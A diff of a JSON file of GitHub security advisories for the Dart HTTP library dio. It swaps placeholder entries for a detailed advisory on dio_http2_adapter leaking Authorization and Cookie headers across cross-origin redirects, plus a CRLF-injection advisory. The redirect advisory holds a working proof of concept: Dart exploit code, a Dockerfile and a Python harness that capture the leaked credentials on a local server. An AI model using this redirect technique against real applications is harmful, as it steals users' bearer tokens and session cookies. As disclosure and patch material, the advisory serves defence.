@@ -1,26 +1,48 @@
 [
   {
-    "ghsa_id": "GHSA-zzzz-yyyy-xxxx",
-    "cve_id": null,
-    "url": "https://api.github.com/repos/cfug/dio/security-advisories/GHSA-zzzz-yyyy-xxxx",
-    "html_url": "https://github.com/cfug/dio/security/advisories/GHSA-zzzz-yyyy-xxxx",
-    "summary": "dio: unreviewed issue published by maintainers",
-    "description": "(本文は省略)",
-    "severity": "critical",
+    "ghsa_id": "GHSA-cr65-55v9-xhvv",
+    "cve_id": "CVE-2026-103030",
+    "url": "https://api.github.com/repos/cfug/dio/security-advisories/GHSA-cr65-55v9-xhvv",
+    "html_url": "https://github.com/cfug/dio/security/advisories/GHSA-cr65-55v9-xhvv",
+    "summary": "Cross-origin redirect leaks sensitive request headers in `dio_http2_adapter`",
+    "description": "## Cross-origin redirect leaks sensitive request headers in `dio_http2_adapter`\r\n\r\n### Summary\r\n\r\n`dio_http2_adapter` follows HTTP `Location` redirects without stripping sensitive request headers when the redirect target is a different origin. An attacker who can cause any origin server to return a cross-origin `302` redirect receives the victim's `Authorization`, `Cookie`, and `Proxy-Authorization` headers verbatim. This vulnerability has a CVSS v3.1 base score of **7.5 (High)** because `followRedirects` is enabled by default, no authentication is required to exploit it, and the confidentiality impact is high.\r\n\r\n### Details\r\n\r\nWhen `Dio` is configured to use `Http2Adapter`, the adapter's internal `_fetch` method constructs HTTP/2 request headers by unconditionally copying all entries from `options.headers`:\r\n\r\n```dart\r\n// plugins/http2_adapter/lib/src/http2_adapter.dart:111\r\nheaders.addAll(\r\n  options.headers.entries.map((entry) {\r\n    ...\r\n    return Header.ascii(entry.key.toLowerCase(), v);\r\n  }).toList(),\r\n);\r\n```\r\n\r\nOn receiving a `3xx` response, the adapter reads the `Location` header and resolves the redirect target URI:\r\n\r\n```dart\r\n// plugins/http2_adapter/lib/src/http2_adapter.dart:254-263\r\nfinal url = responseHeaders.value('location');\r\nfinal uri = Uri.parse(url ?? '');\r\nfinal String path = resolveRedirectUri(options.uri, uri).toString();\r\nreturn _fetch(options.copyWith(path: path, maxRedirects: --options.maxRedirects), ...);\r\n```\r\n\r\n`options.copyWith` is called without an explicit `headers` argument; `dio/lib/src/options.dart:629` therefore preserves the full original header map via `headers ?? Map.from(this.headers)`. `resolveRedirectUri` (`http2_adapter.dart:290`) returns an attacker-controlled cross-origin URI without any origin comparison. The combination means that on every redirect, the full set of original sensitive headers — including `Authorization`, `Cookie`, and `Proxy-Authorization` — is forwarded to the new authority with no sanitization.\r\n\r\n**Data flow (source → sink):**\r\n\r\n1. `dio/lib/src/dio_mixin.dart:383` — public `Dio.request<T>(String path, ...)` entry point.\r\n2. `dio/lib/src/options.dart:331` — base and per-request headers merged into `RequestOptions`.\r\n3. `dio/lib/src/dio_mixin.dart:596` — `httpClientAdapter.fetch(reqOpt, ...)` dispatches to `Http2Adapter`.\r\n4. `plugins/http2_adapter/lib/src/http2_adapter.dart:254` — `Location` header is read from the network response (attacker-controlled source).\r\n5. `plugins/http2_adapter/lib/src/http2_adapter.dart:258` — redirect target URI resolved; cross-origin check absent.\r\n6. `plugins/http2_adapter/lib/src/http2_adapter.dart:260` — `options.copyWith(path: path, ...)` called without `headers` override.\r\n7. `dio/lib/src/options.dart:629` — `copyWith` preserves `Map.from(this.headers)` — all sensitive headers retained.\r\n8. `plugins/http2_adapter/lib/src/http2_adapter.dart:111` — preserved headers emitted verbatim to the cross-origin HTTP/2 request (sink).\r\n\r\n**Suggested patch** — strip sensitive headers before following a cross-origin redirect:\r\n\r\n```diff\r\n--- a/plugins/http2_adapter/lib/src/http2_adapter.dart\r\n+++ b/plugins/http2_adapter/lib/src/http2_adapter.dart\r\n+  static const _sensitiveRedirectHeaders = {\r\n+    'authorization',\r\n+    'cookie',\r\n+    'proxy-authorization',\r\n+  };\r\n+\r\n-      final String path = resolveRedirectUri(options.uri, uri).toString();\r\n+      final redirectUri = resolveRedirectUri(options.uri, uri);\r\n+      final redirectOptions = options.copyWith(\r\n+        path: redirectUri.toString(),\r\n+        maxRedirects: --options.maxRedirects,\r\n+      );\r\n+      if (!_sameOrigin(options.uri, redirectUri)) {\r\n+        redirectOptions.headers.removeWhere(\r\n+          (name, _) => _sensitiveRedirectHeaders.contains(name.toLowerCase()),\r\n+        );\r\n+      }\r\n       return _fetch(\r\n-        options.copyWith(path: path, maxRedirects: --options.maxRedirects),\r\n+        redirectOptions,\r\n         list != null ? Stream.fromIterable(list) : null,\r\n         cancelFuture,\r\n         redirects,\r\n       );\r\n+\r\n+  static bool _sameOrigin(Uri a, Uri b) =>\r\n+      a.scheme == b.scheme && a.host == b.host && a.port == b.port;\r\n```\r\n\r\n### PoC\r\n\r\nThe following steps reproduce the vulnerability using two local HTTP/2 cleartext (h2c) servers inside an isolated Docker container (no external network required).\r\n\r\n**Prerequisites:**\r\n\r\n- Docker installed and accessible.\r\n- Repository checked out at the path used as the build context.\r\n\r\n**Build and run:**\r\n\r\n```bash\r\n# From the repository root (github_web_81_cfug__dio/)\r\ndocker build -f vuln-001/Dockerfile -t dio-vuln-001:poc .\r\ndocker run --rm --network none dio-vuln-001:poc\r\n```\r\n\r\n**What the container does:**\r\n\r\n1. Starts an *origin* h2c server on `127.0.0.1:18081` that immediately returns `302 Location: http://127.0.0.1:18082/capture`.\r\n2. Starts an *attacker* h2c server on `127.0.0.1:18082` that logs every received header.\r\n3. Executes the following Dart exploit:\r\n\r\n```dart\r\nfinal dio = Dio()\r\n  ..httpClientAdapter = Http2Adapter(ConnectionManager());\r\nawait dio.get(\r\n  'http://127.0.0.1:18081/start',\r\n  options: Options(headers: {\r\n    'Authorization': '***',\r\n    'Cookie': 'sid=SECRET_SESSION_ABC',\r\n    'x-secret': 'internal-secret-value',\r\n  }),\r\n);\r\n```\r\n\r\n**Expected output (confirms vulnerability):**\r\n\r\n```\r\nRESULT=VULN_CONFIRMED\r\nLEAKED_HEADER=authorization: *** Received headers:\r\n[ATTACKER]   authorization: ***   cookie: sid=SECRET_SESSION_ABC\r\n[ATTACKER]   x-secret: internal-secret-value\r\n```\r\n\r\nThe attacker server at `127.0.0.1:18082` receives all three sensitive headers, demonstrating that `Http2Adapter` forwards them verbatim across the cross-origin redirect with no stripping.\r\n\r\n### Impact\r\n\r\nThis is a **sensitive information disclosure** vulnerability. Any application that:\r\n\r\n1. configures `Dio` with `Http2Adapter`, and\r\n2. sends requests carrying `Authorization`, `Cookie`, or `Proxy-Authorization` headers,\r\n\r\nis affected. Because `followRedirects` defaults to `true` and `maxRedirects` defaults to `5`, no additional configuration is needed to trigger the bug.\r\n\r\nAn attacker who controls — or can compromise — any HTTP server that the victim application contacts can issue a `302` redirect to an attacker-owned server and thereby capture the victim's bearer tokens, session cookies, or proxy credentials. The attack requires no prior authentication and is executable over the network with low complexity. Stolen credentials may then be used to impersonate the victim against the original service or any other service that accepts the same token.\r\n\r\nAffected parties include server-side Dart/Flutter applications and CLI tools that make authenticated HTTP/2 requests through `dio_http2_adapter`.\r\n\r\n### Reproduction artifacts\r\n\r\n#### `Dockerfile`\r\n\r\n```dockerfile\r\n# Dockerfile for VULN-001 dynamic reproduction\r\n# Vulnerability: Cross-origin redirect leaks sensitive request headers in dio_http2_adapter\r\n#\r\n# Build context: the parent directory (github_web_81_cfug__dio/)\r\n#   docker build -f vuln-001/Dockerfile -t dio-vuln-001 .\r\n#\r\n# What this image does:\r\n#   1. Installs Dart SDK (stable)\r\n#   2. Copies the vulnerable repository source (dio + dio_http2_adapter)\r\n#   3. Creates a PoC Dart project using path dependencies to the local source\r\n#   4. Resolves pub packages\r\n#   5. On container run: executes the exploit script that starts two local\r\n#      h2c servers (origin + attacker) and makes a redirected request to prove\r\n#      that Authorization/Cookie headers are forwarded to the cross-origin target\r\n\r\nFROM dart:stable AS builder\r\n\r\n# ── Repository source ──────────────────────────────────────────────────────────\r\n# Copy only the packages we need to keep image small\r\nCOPY repo/dio/ /repo/dio/\r\nCOPY repo/plugins/http2_adapter/ /repo/plugins/http2_adapter/\r\n\r\n# ── PoC project setup ──────────────────────────────────────────────────────────\r\nWORKDIR /poc\r\n\r\nCOPY vuln-001/poc_pubspec.yaml pubspec.yaml\r\nCOPY vuln-001/poc_exploit.dart lib/main.dart\r\n\r\n# Resolve dependencies (requires network access to pub.dev for http2, meta, etc.)\r\nRUN dart pub get\r\n\r\n# ── Runtime image (reuse builder to keep it simple) ────────────────────────────\r\nFROM builder AS final\r\n\r\nWORKDIR /poc\r\n\r\n# Run the exploit; exit code:\r\n#   0 = VULN_CONFIRMED (authorization header leaked to attacker)\r\n#   1 = NOT_VULNERABLE  (header was stripped or redirect not followed)\r\n#   2 = FAIL            (attacker server never received a request — env issue)\r\nCMD [\"dart\", \"run\", \"lib/main.dart\"]\r\n```\r\n\r\n#### `poc.py`\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nPoC orchestrator for VULN-001:\r\n  Cross-origin redirect leaks sensitive request headers in dio_http2_adapter.\r\n\r\nUsage:\r\n    python3 poc.py [--image-tag TAG]\r\n\r\nWhat it does:\r\n    1. Builds a Docker image containing the vulnerable dio_http2_adapter source\r\n       and a Dart exploit script (poc_exploit.dart).\r\n    2. Runs the container, which:\r\n         a. Starts two local h2c (HTTP/2 cleartext) servers inside the container:\r\n              - Origin  (127.0.0.1:18081): returns 302 → attacker\r\n              - Attacker (127.0.0.1:18082): logs all received headers\r\n         b. Uses dio + Http2Adapter to GET http://origin/start with\r\n            Authorization and Cookie headers.\r\n         c. Follows the 302 redirect to the attacker server.\r\n         d. Reports whether the Authorization header was captured by the attacker.\r\n    3. Writes phase2_result.json with structured verdict.\r\n\r\nExit codes:\r\n    0  PASS   — vulnerability confirmed\r\n    1  FAIL   — not reproduced\r\n    2  ERROR  — build or runtime environment problem\r\n\"\"\"\r\n\r\nimport argparse\r\nimport json\r\nimport os\r\nimport subprocess\r\nimport sys\r\nimport textwrap\r\nfrom pathlib import Path\r\n\r\n# ── Paths ──────────────────────────────────────────────────────────────────────\r\nSCRIPT_DIR = Path(__file__).resolve().parent\r\nREPO_ROOT = SCRIPT_DIR.parent          # github_web_81_cfug__dio/\r\nRESULT_FILE = SCRIPT_DIR / \"phase2_result.json\"\r\n\r\nBUILD_CONTEXT = str(REPO_ROOT)\r\nDOCKERFILE = str(SCRIPT_DIR / \"Dockerfile\")\r\nDEFAULT_IMAGE_TAG = \"dio-vuln-001:poc\"\r\n\r\n\r\ndef run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:\r\n    \"\"\"Run a subprocess command, streaming stdout/stderr to the terminal.\"\"\"\r\n    print(f\"[+] {' '.join(cmd)}\", flush=True)\r\n    return subprocess.run(cmd, **kwargs)\r\n\r\n\r\ndef build_image(tag: str) -> bool:\r\n    \"\"\"Build the Docker image. Returns True on success.\"\"\"\r\n    result = run(\r\n        [\r\n            \"docker\", \"build\",\r\n            \"--file\", DOCKERFILE,\r\n            \"--tag\", tag,\r\n            BUILD_CONTEXT,\r\n        ],\r\n        check=False,\r\n    )\r\n    if result.returncode != 0:\r\n        print(f\"[!] Docker build failed (exit {result.returncode})\", file=sys.stderr)\r\n        return False\r\n    return True\r\n\r\n\r\ndef run_container(tag: str, timeout_sec: int = 120) -> tuple[int, str, str]:\r\n    \"\"\"\r\n    Run the container and capture its output.\r\n\r\n    Returns:\r\n        (returncode, stdout, stderr)\r\n    \"\"\"\r\n    result = run(\r\n        [\r\n            \"docker\", \"run\",\r\n            \"--rm\",\r\n            \"--network\", \"none\",   # no external network; loopback only\r\n            tag,\r\n        ],\r\n        capture_output=True,\r\n        text=True,\r\n        timeout=timeout_sec,\r\n        check=False,\r\n    )\r\n    return result.returncode, result.stdout, result.stderr\r\n\r\n\r\ndef parse_output(stdout: str, stderr: str) -> dict:\r\n    \"\"\"\r\n    Parse structured key=value lines from the exploit's stdout.\r\n\r\n    The Dart exploit writes lines like:\r\n        RESULT=VULN_CONFIRMED\r\n        LEAKED_HEADER=authorization: ***        EVIDENCE=...\r\n    \"\"\"\r\n    parsed = {}\r\n    for line in stdout.splitlines():\r\n        if \"=\" in line:\r\n            key, _, val = line.partition(\"=\")\r\n            parsed[key.strip()] = val.strip()\r\n    return parsed\r\n\r\n\r\ndef write_result(data: dict) -> None:\r\n    with open(RESULT_FILE, \"w\", encoding=\"utf-8\") as f:\r\n        json.dump(data, f, ensure_ascii=False, indent=2)\r\n    print(f\"\\n[+] Result written to {RESULT_FILE}\")\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=__doc__)\r\n    parser.add_argument(\r\n        \"--image-tag\", default=DEFAULT_IMAGE_TAG,\r\n        help=f\"Docker image tag (default: {DEFAULT_IMAGE_TAG})\",\r\n    )\r\n    args = parser.parse_args()\r\n    tag = args.image_tag\r\n\r\n    build_cmd = (\r\n        f\"docker build -f vuln-001/Dockerfile -t {tag} .\"\r\n    )\r\n    run_cmd = (\r\n        f\"docker run --rm --network none {tag}\"\r\n    )\r\n    poc_cmd = (\r\n        f\"cd {REPO_ROOT} && {build_cmd} && {run_cmd}\"\r\n    )\r\n\r\n    # ── Step 1: Build ──────────────────────────────────────────────────────────\r\n    print(\"=\" * 70)\r\n    print(\"STEP 1: Building Docker image\")\r\n    print(\"=\" * 70)\r\n    if not build_image(tag):\r\n        result_data = {\r\n            \"passed\": False,\r\n            \"verdict\": \"FAIL\",\r\n            \"reason\": \"Docker image build failed — dart pub get or source copy error\",\r\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\r\n            \"run_command\": run_cmd,\r\n            \"poc_command\": poc_cmd,\r\n            \"evidence\": \"docker build non-zero exit code\",\r\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\r\n        }\r\n        write_result(result_data)\r\n        return 2\r\n\r\n    # ── Step 2: Run exploit ────────────────────────────────────────────────────\r\n    print(\"\\n\" + \"=\" * 70)\r\n    print(\"STEP 2: Running exploit container\")\r\n    print(\"=\" * 70)\r\n\r\n    try:\r\n        returncode, stdout, stderr = run_container(tag)\r\n    except subprocess.TimeoutExpired:\r\n        result_data = {\r\n            \"passed\": False,\r\n            \"verdict\": \"INCOMPLETE\",\r\n            \"reason\": \"Container execution did not complete within 120 seconds and was terminated due to timeout\",\r\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\r\n            \"run_command\": run_cmd,\r\n            \"poc_command\": poc_cmd,\r\n            \"evidence\": \"subprocess.TimeoutExpired after 120 s\",\r\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\r\n        }\r\n        write_result(result_data)\r\n        return 2\r\n\r\n    print(\"\\n── Container STDOUT ─────────────────────────────────────────────\")\r\n    print(stdout or \"(empty)\")\r\n    print(\"── Container STDERR ─────────────────────────────────────────────\")\r\n    print(stderr or \"(empty)\")\r\n    print(\"── Exit code:\", returncode, \"─────────────────────────────────────\")\r\n\r\n    # ── Step 3: Evaluate results ───────────────────────────────────────────────\r\n    parsed = parse_output(stdout, stderr)\r\n    exploit_result = parsed.get(\"RESULT\", \"\")\r\n    leaked_header = parsed.get(\"LEAKED_HEADER\", \"\")\r\n    evidence_line = parsed.get(\"EVIDENCE\", \"\")\r\n\r\n    if returncode == 0 and exploit_result == \"VULN_CONFIRMED\" and leaked_header:\r\n        # Combine stdout + a snippet of stderr for the evidence field\r\n        stderr_snippet = \"\\n\".join(\r\n            line for line in stderr.splitlines()\r\n            if any(tag in line for tag in (\"[ATTACKER]\", \"[RESULT]\", \"[EVIDENCE]\"))\r\n        )[:1500]\r\n        evidence = (\r\n            f\"stdout: {stdout.strip()}\\n\\n\"\r\n            f\"stderr (relevant):\\n{stderr_snippet}\"\r\n        )\r\n        result_data = {\r\n            \"passed\": True,\r\n            \"verdict\": \"PASS\",\r\n            \"reason\": (\r\n                \"dio_http2_adapter forwarded the original Authorization header verbatim \"\r\n                \"to the attacker's server without stripping it when following a \"\r\n                \"cross-origin 302 redirect. The attacker h2c server (127.0.0.1:18082) \"\r\n                f\"received '{leaked_header}'.\"\r\n            ),\r\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\r\n            \"run_command\": run_cmd,\r\n            \"poc_command\": poc_cmd,\r\n            \"evidence\": evidence,\r\n            \"artifacts\": [\r\n                \"Dockerfile\",\r\n                \"poc_exploit.dart\",\r\n                \"poc_pubspec.yaml\",\r\n                \"poc.py\",\r\n            ],\r\n        }\r\n        write_result(result_data)\r\n        print(\"\\n[PASS] VULN-001 reproduced successfully.\")\r\n        return 0\r\n\r\n    elif returncode == 1 or exploit_result == \"NOT_VULNERABLE\":\r\n        result_data = {\r\n            \"passed\": False,\r\n            \"verdict\": \"FAIL\",\r\n            \"reason\": (\r\n                \"Container execution succeeded, but the attacker server did not \"\r\n                \"receive the Authorization header. The vulnerability was not \"\r\n                f\"reproduced in this environment. Parsed result: {parsed}\"\r\n            ),\r\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\r\n            \"run_command\": run_cmd,\r\n            \"poc_command\": poc_cmd,\r\n            \"evidence\": stdout + \"\\n\" + stderr,\r\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\r\n        }\r\n        write_result(result_data)\r\n        print(\"\\n[FAIL] Vulnerability not reproduced.\")\r\n        return 1\r\n\r\n    else:\r\n        # returncode == 2 or other unexpected failure\r\n        result_data = {\r\n            \"passed\": False,\r\n            \"verdict\": \"INCOMPLETE\",\r\n            \"reason\": (\r\n                f\"Container execution failed or exited with an unexpected code {returncode}. \"\r\n                \"Cause: h2c server startup error, network issue, or Dart runtime \"\r\n                \"error. Check the stderr log and retry without --network none.\"\r\n            ),\r\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\r\n            \"run_command\": run_cmd,\r\n            \"poc_command\": poc_cmd,\r\n            \"evidence\": f\"exit={returncode}\\nstdout={stdout}\\nstderr={stderr}\",\r\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\r\n        }\r\n        write_result(result_data)\r\n        print(f\"\\n[INCOMPLETE] Container exited with code {returncode}.\")\r\n        return 2\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    sys.exit(main())\r\n```\n",
+    "severity": "high",
     "author": null,
     "publisher": {
-      "login": "maintainer"
+      "login": "AlexV525",
+      "id": 15884415,
+      "node_id": "MDQ6VXNlcjE1ODg0NDE1",
+      "avatar_url": "https://avatars.githubusercontent.com/u/15884415?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/AlexV525",
+      "html_url": "https://github.com/AlexV525",
+      "followers_url": "https://api.github.com/users/AlexV525/followers",
+      "following_url": "https://api.github.com/users/AlexV525/following{/other_user}",
+      "gists_url": "https://api.github.com/users/AlexV525/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/AlexV525/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/AlexV525/subscriptions",
+      "organizations_url": "https://api.github.com/users/AlexV525/orgs",
+      "repos_url": "https://api.github.com/users/AlexV525/repos",
+      "events_url": "https://api.github.com/users/AlexV525/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/AlexV525/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
     },
     "identifiers": [
       {
-        "value": "GHSA-zzzz-yyyy-xxxx",
+        "value": "GHSA-cr65-55v9-xhvv",
         "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-103030",
+        "type": "CVE"
       }
     ],
     "state": "published",
-    "created_at": "2026-10-20T00:00:00Z",
-    "updated_at": "2026-10-23T00:00:00Z",
-    "published_at": "2026-10-23T00:00:00Z",
+    "created_at": null,
+    "updated_at": "2026-10-01T16:07:40Z",
+    "published_at": "2026-08-15T14:34:57Z",
     "closed_at": null,
     "withdrawn_at": null,
     "submission": null,
@@ -28,33 +50,132 @@
       {
         "package": {
           "ecosystem": "pub",
-          "name": "dio"
+          "name": "dio_http2_adapter"
         },
-        "vulnerable_version_range": ">= 4.0.0, < 4.0.7",
-        "patched_versions": "4.0.7",
+        "vulnerable_version_range": ">=1.0.0 <= 2.7.1",
+        "patched_versions": "2.8.0",
         "vulnerable_functions": []
       }
     ],
-    "cvss": null,
-    "cwes": [],
-    "cwe_ids": [],
-    "credits": [],
-    "credits_detailed": [],
-    "collaborating_users": [],
-    "collaborating_teams": [],
-    "private_fork": null
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-200"
+    ],
+    "credits": [
+      {
+        "login": "EQSTLab",
+        "type": "reporter"
+      },
+      {
+        "login": "useworld",
+        "type": "finder"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "EQSTLab",
+          "id": 148991397,
+          "node_id": "U_kgDOCOFtpQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/EQSTLab",
+          "html_url": "https://github.com/EQSTLab",
+          "followers_url": "https://api.github.com/users/EQSTLab/followers",
+          "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+          "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+          "repos_url": "https://api.github.com/users/EQSTLab/repos",
+          "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "useworld",
+          "id": 16302604,
+          "node_id": "MDQ6VXNlcjE2MzAyNjA0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/16302604?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/useworld",
+          "html_url": "https://github.com/useworld",
+          "followers_url": "https://api.github.com/users/useworld/followers",
+          "following_url": "https://api.github.com/users/useworld/following{/other_user}",
+          "gists_url": "https://api.github.com/users/useworld/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/useworld/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/useworld/subscriptions",
+          "organizations_url": "https://api.github.com/users/useworld/orgs",
+          "repos_url": "https://api.github.com/users/useworld/repos",
+          "events_url": "https://api.github.com/users/useworld/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/useworld/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 7.5
+    }
   },
   {
     "ghsa_id": "GHSA-9324-jv53-9cc8",
     "cve_id": "CVE-2021-31402",
     "url": "https://api.github.com/repos/cfug/dio/security-advisories/GHSA-9324-jv53-9cc8",
     "html_url": "https://github.com/cfug/dio/security/advisories/GHSA-9324-jv53-9cc8",
-    "summary": "dio vulnerable to CRLF injection with HTTP method string",
-    "description": "(本文は省略)",
+    "summary": "CRLF injection with HTTP method string",
+    "description": "### Impact\r\nThe dio package 4.0.0 for Dart allows CRLF injection if the attacker controls the HTTP method string, a different vulnerability than CVE-2020-35669.\r\n\r\n### Patches\r\nThe vulnerability has been resolved by https://github.com/cfug/dio/commit/927f79e93ba39f3c3a12c190624a55653d577984, and included since v5.0.0.\r\n\r\n### Workarounds\r\nCherry-pick the commit to your own fork can resolves the vulberability too.\r\n\r\n### References\r\n- https://nvd.nist.gov/vuln/detail/CVE-2021-31402\r\n- https://osv.dev/GHSA-jwpw-q68h-r678\r\n- https://github.com/cfug/dio/issues/1130\r\n- https://github.com/cfug/dio/issues/1752\r\n",
     "severity": "high",
     "author": null,
     "publisher": {
-      "login": "maintainer"
+      "login": "AlexV525",
+      "id": 15884415,
+      "node_id": "MDQ6VXNlcjE1ODg0NDE1",
+      "avatar_url": "https://avatars.githubusercontent.com/u/15884415?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/AlexV525",
+      "html_url": "https://github.com/AlexV525",
+      "followers_url": "https://api.github.com/users/AlexV525/followers",
+      "following_url": "https://api.github.com/users/AlexV525/following{/other_user}",
+      "gists_url": "https://api.github.com/users/AlexV525/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/AlexV525/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/AlexV525/subscriptions",
+      "organizations_url": "https://api.github.com/users/AlexV525/orgs",
+      "repos_url": "https://api.github.com/users/AlexV525/repos",
+      "events_url": "https://api.github.com/users/AlexV525/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/AlexV525/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
     },
     "identifiers": [
       {
@@ -67,9 +188,9 @@
       }
     ],
     "state": "published",
-    "created_at": "2026-10-20T00:00:00Z",
-    "updated_at": "2026-10-23T00:00:00Z",
-    "published_at": "2026-10-23T00:00:00Z",
+    "created_at": null,
+    "updated_at": "2023-03-21T18:22:30Z",
+    "published_at": "2023-03-21T18:22:30Z",
     "closed_at": null,
     "withdrawn_at": null,
     "submission": null,
@@ -79,53 +200,128 @@
           "ecosystem": "pub",
           "name": "dio"
         },
-        "vulnerable_version_range": "",
+        "vulnerable_version_range": "<5.0.0",
         "patched_versions": "5.0.0",
         "vulnerable_functions": []
       }
     ],
-    "cvss": null,
-    "cwes": [],
-    "cwe_ids": [],
-    "credits": [],
-    "credits_detailed": [],
-    "collaborating_users": [],
-    "collaborating_teams": [],
-    "private_fork": null
-  },
-  {
-    "ghsa_id": "GHSA-qqqq-rrrr-ssss",
-    "cve_id": null,
-    "url": "https://api.github.com/repos/cfug/dio/security-advisories/GHSA-qqqq-rrrr-ssss",
-    "html_url": "https://github.com/cfug/dio/security/advisories/GHSA-qqqq-rrrr-ssss",
-    "summary": "Advisory that names no package",
-    "description": "(本文は省略)",
-    "severity": "moderate",
-    "author": null,
-    "publisher": {
-      "login": "maintainer"
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
     },
-    "identifiers": [
+    "cwes": [
       {
-        "value": "GHSA-qqqq-rrrr-ssss",
-        "type": "GHSA"
+        "cwe_id": "CWE-74",
+        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
       }
     ],
-    "state": "published",
-    "created_at": "2026-10-20T00:00:00Z",
-    "updated_at": "2026-10-23T00:00:00Z",
-    "published_at": "2026-10-23T00:00:00Z",
-    "closed_at": null,
-    "withdrawn_at": null,
-    "submission": null,
-    "vulnerabilities": [],
-    "cvss": null,
-    "cwes": [],
-    "cwe_ids": [],
-    "credits": [],
-    "credits_detailed": [],
-    "collaborating_users": [],
-    "collaborating_teams": [],
-    "private_fork": null
+    "cwe_ids": [
+      "CWE-74"
+    ],
+    "credits": [
+      {
+        "login": "licy183",
+        "type": "reporter"
+      },
+      {
+        "login": "AlexV525",
+        "type": "remediation_developer"
+      },
+      {
+        "login": "set0x",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "licy183",
+          "id": 45286352,
+          "node_id": "MDQ6VXNlcjQ1Mjg2MzUy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/45286352?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/licy183",
+          "html_url": "https://github.com/licy183",
+          "followers_url": "https://api.github.com/users/licy183/followers",
+          "following_url": "https://api.github.com/users/licy183/following{/other_user}",
+          "gists_url": "https://api.github.com/users/licy183/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/licy183/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/licy183/subscriptions",
+          "organizations_url": "https://api.github.com/users/licy183/orgs",
+          "repos_url": "https://api.github.com/users/licy183/repos",
+          "events_url": "https://api.github.com/users/licy183/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/licy183/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "AlexV525",
+          "id": 15884415,
+          "node_id": "MDQ6VXNlcjE1ODg0NDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/15884415?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/AlexV525",
+          "html_url": "https://github.com/AlexV525",
+          "followers_url": "https://api.github.com/users/AlexV525/followers",
+          "following_url": "https://api.github.com/users/AlexV525/following{/other_user}",
+          "gists_url": "https://api.github.com/users/AlexV525/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/AlexV525/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/AlexV525/subscriptions",
+          "organizations_url": "https://api.github.com/users/AlexV525/orgs",
+          "repos_url": "https://api.github.com/users/AlexV525/repos",
+          "events_url": "https://api.github.com/users/AlexV525/events{/privacy}",
